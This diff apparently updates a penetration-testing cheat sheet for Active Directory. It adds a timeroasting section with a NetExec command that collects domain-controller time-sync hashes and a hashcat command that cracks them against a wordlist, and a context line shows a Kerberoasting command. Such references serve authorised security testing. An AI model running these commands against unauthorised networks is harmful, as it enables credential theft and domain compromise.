@@ -155,7 +155,12 @@ nxc ldap $DC_IP -u 'username' -p 'password --kerberoast - -k
 ## 3.6 Timeroasting 
 
 ```bash
+# Timeroasting over MS-SNTP
+- [Pentest-Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/timeroasting)
+
 nxc smb $DC_IP -M timeroast 
+
+hashcat -m 31300 -a 0 hashes rockyou.txt --username
 ```
 
 ---
